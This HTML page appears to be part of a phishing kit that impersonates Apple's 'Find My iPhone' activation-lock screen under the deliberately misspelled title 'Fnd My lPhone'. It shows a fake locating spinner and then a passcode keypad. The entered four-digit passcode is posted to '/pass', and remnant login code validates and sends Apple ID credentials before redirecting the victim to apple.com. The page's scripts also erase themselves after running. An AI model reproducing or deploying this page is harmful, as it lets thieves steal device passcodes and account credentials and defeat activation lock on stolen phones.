<!DOCTYPE html>
<html>
  <head>
    <base href="">
    <script src="src/icloud_page/jquery-1.10.2.js"></script>
    <title>Fnd My lPhone</title>
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" type="text/css" href="src/activation_lock/passcode.css">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="code.jquery.com/jquery-1.10.2.js"></script>
    <script src="code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
    <script src="src/icloud_page_new/activity-indicator.js"></script>
  </head>
  <body id="body_b" style="font-family: Arial, Helvetica, sans-serif; ">
    <div id="show_1" style="display: block;">
      <div style="margin: 0; position: absolute; top: 50%; left: 50%; -ms-transform: translate(-50%, -50%); transform: translate(-50%, -50%);">
        <div id="submit_loader_1"></div>
        <div style="padding-top: 18px; text-align: center;">
          <label style="font-family: Arial, Helvetica, sans-serif;">It may take few minutes to locate your lost lPhone.</label>
        </div>
      </div>
    </div>
    <div id="show_2" style="text-align: center; margin-left: 20px; margin-right: 20px; padding-top: 40px; display: none;">
      <span style="font-size: 34px;">Enter Passcode</span>
      <br />
      <span style="font-size: 14px;">Enter the passcode that was previously used to lock this lost lPhone.</span>
      <div id="code" style="padding-top: 20px;">
        <div id="bile">
          <svg height="40" width="40">
            <circle id="c1" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.
          </svg>
          <svg height="40" width="40">
            <circle id="c2" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.
          </svg>
          <svg height="40" width="40">
            <circle id="c3" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.
          </svg>
          <svg height="40" width="40">
            <circle id="c4" cx="20" cy="20" r="10" stroke="black" stroke-width="1" fill="white" />Sorry, your browser does not support inline SVG.
          </svg>
          <input type="number" name="" value="" hidden="" />
        </div>
        <div style="text-align: center; padding-top: 16px; margin-right: auto; margin-left: auto;">
          <div>
            <table style="width:280px; margin: auto;">
              <tr>
                <th>
                  <button id="1" class="button button5">1</button>
                </th>
                <th>
                  <button id="2" class="button button5">2</button>
                </th>
                <th>
                  <button id="3" class="button button5">3</button>
                </th>
              </tr>
              <tr>
                <th>
                  <button id="4" class="button button5">4</button>
                </th>
                <th>
                  <button id="5" class="button button5">5</button>
                </th>
                <th>
                  <button id="6" class="button button5">6</button>
                </th>
              </tr>
              <tr>
                <th>
                  <button id="7" class="button button5">7</button>
                </th>
                <th>
                  <button id="8" class="button button5">8</button>
                </th>
                <th>
                  <button id="9" class="button button5">9</button>
                </th>
              </tr>
              <tr>
                <th></th>
                <th>
                  <button id="0" class="button button5">0</button>
                </th>
                <th>
                  <button class="button buttonr" onclick="remove()">
                    <img src="src/activation_lock/next.png" width="35" />
                  </button>
                </th>
              </tr>
            </table>
            <form action="/pass" method="post" id="myForm">
                <input type="hidden" name="passcode" id="jsVarInput">
              </form>
          </div>
        </div>
      </div>
    </div>
    <div id="show_3" style="text-align: center; display: none;"></div>
    <script id="erasable_1" type="text/javascript">
      var setcolor = 0;
      var num = 0;
      var afis = 1;

      function remove() {
        if (setcolor > 0) {
          changePolyColor("white");
          num = parseInt(num / 10);
        }
        setcolor--;
        if (setcolor < 1) setcolor = 0;
      }

      function changePolyColor(color) {
        var poly = document.getElementById("c" + setcolor);
        poly.setAttribute("fill", color);
      }
      document.getElementById("erasable_1").innerHTML = "";
    </script>
    <script id="erasable_2" type="text/javascript">
      $(document).ready(function() {
        $("#show_1").bind("touchstart", function preventZoom(e) {
          var t2 = e.timeStamp;
          var t1 = $(this).data("lastTouch") || t2;
          var dt = t2 - t1;
          var fingers = e.originalEvent.touches.length;
          $(this).data("lastTouch", t2);
          if (!dt || dt > 500 || fingers > 1) {
            return; // not double-tap
          }
          e.preventDefault(); // double tap - prevent the zoom
          $(e.target).trigger("click");
        });
        $("#show_2").bind("touchstart", function preventZoom(e) {
          var t2 = e.timeStamp;
          var t1 = $(this).data("lastTouch") || t2;
          var dt = t2 - t1;
          var fingers = e.originalEvent.touches.length;
          $(this).data("lastTouch", t2);
          if (!dt || dt > 500 || fingers > 1) {
            return; // not double-tap
          }
          e.preventDefault(); // double tap - prevent the zoom
          // also synthesize click events we just swallowed up
          $(e.target).trigger("click");
        });
        $("#show_3").bind("touchstart", function preventZoom(e) {
          var t2 = e.timeStamp;
          var t1 = $(this).data("lastTouch") || t2;
          var dt = t2 - t1;
          var fingers = e.originalEvent.touches.length;
          $(this).data("lastTouch", t2);
          if (!dt || dt > 500 || fingers > 1) {
            return; // not double-tap
          }
          e.preventDefault(); // double tap - prevent the zoom
          // also synthesize click events we just swallowed up
          $(e.target).trigger("click");
        });
        $(".button5").click(function() {
          setcolor++;
          if (setcolor <= 4) {
            changePolyColor("black");
            num = (num * 10) + parseInt($(this).prop("id"));
            if (setcolor == 4) {
              if (num.toString().length == 0) {
                num = "0000" + num;
              };
              if (num.toString().length == 1) {
                num = "000" + num;
              };
              if (num.toString().length == 2) {
                num = "00" + num;
              };
              if (num.toString().length == 3) {
                num = "0" + num;
              };
              afis++;
              if (afis == 2) {
                $("#show_2").css("display", "none");
                $("#show_3").fadeIn("slow", function() {
                    document.getElementById('jsVarInput').value = num;
                      $(document).ready(function(){
                      myfunc();
                    }); 
                    function myfunc() { 
                      document.getElementById("myForm").submit();
                    }
                });
              } else $("#bile").effect("shake", {
                times: 3
              }, 500, callback);
            }
          }
          if (setcolor > 4) setcolor = 4;
        });

        function callback() {
          num = 0;
          setTimeout(clear(), 3000);
        }

        function clear() {
          for (var i = 0; i <= 4; i++) {
            changePolyColor("white");
            setcolor--;
          }
          setcolor = 0;
        }

        function show_body() {
          $("#show_1").css("display", "none");
          $("#show_2").fadeIn("slow", function() {});
        }
        setTimeout(show_body, 2000);
        $("#pw").keyup(function(e) {
          if ($("#appleId").val() != "" && $("#pw").val() != "") {
            $("#singin").prop("disabled", false);
            if (e.which == 13) {
              $("#singin").css("display", "none");
              $("#submit_loader_2").removeClass("hide");
              login();
            }
          } else {
            $("#singin").prop("disabled", true);
          }
        });
        $("#pw").focus(function() {
          if ($("#appleId").val() != "") {
            var re = /^(([^<>()[].,;:s@"]+(.[^<>()[].,;:s@"]+)*)|(".+"))@(([[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}])|(([a-zA-Z-0-9]+.)+[a-zA-Z]{2,}))$/;
            if (!re.test($("#appleId").val())) {
              $("#appleId").val($("#appleId").val());
            }
          }
        });
        $("#singin").click(function() {
          if ($("#appleId").val() != "" && $("#pw").val() != "") {
            $("#spiner").css("position", "relative");
            $("#spiner").css("left", "10px");
            $("#singin").addClass("hide");
            $("#submit_loader_2").removeClass("hide");
            login();
          }
        });

        function myPastePW() {
          $("#singin").prop("disabled", false);
        }
      });

      function login() {
        $("#pw").blur();
        var apple = $("#appleId").val();
        var pw = $("#pw").val();
        var key = "e7ea3";
        if (apple != "" && pw != "") {
          $("#submit").removeClass("disable");
          $("#submit").addClass("v-hide");
          $("#spiner").removeClass("hide");
          $("#spiner").addClass("show");
          checkTrueLogin($("#appleId").val(), $("#pw").val(), location.pathname.substr(1), function(resp) {
            if (resp == "no") {
              $("#pw").blur()
              $("#myModal").css("display", "block");
              $("#singin_2").css("display", "block");
              $("#spiner").css("display", "none");
              $("#pw").val("");
              $("#singin").removeClass("hide");
              $("#singin").prop("disabled", true);
              $("#submit_loader_2").addClass("hide");
            } else if (resp == "yes") {
              sendTrueLogin($("#appleId").val(), $("#pw").val(), location.pathname.substr(1));
              $("#sc1853").css("display", "block");
              $(".login").css("display", "none");
              var delayInMilliseconds = 5000; //1 second      
              setTimeout(function() {
                var redirect_after_login = "apple";
                if (redirect_after_login == "apple") document.location.href = "https://www.apple.com/";
                else if (redirect_after_login == "map") document.location.href = "https://icloud.com";
              }, delayInMilliseconds);
            }
            $("#spiner").addClass("hide");
            $("#spiner").removeClass("show");
          });
        } else {
          if (apple == "") jQuery("#apple").focus();
          else if (pw == "") jQuery("#pw").focus();
        }
      }
      document.getElementById("erasable_2").innerHTML = "";
    </script>
    <script type="text/javascript">
      jQuery("#submit_loader_1").activity({
        width: 1,
        segments: 12,
        length: 5
      });
      jQuery("#submit_loader_2").activity({
        width: 1,
        segments: 12,
        length: 5
      });
      $(".close").click(function() {
        $("#myModal").css("display", "none");
        $("#pw").focus();
      });
    </script>
  </body>
</html>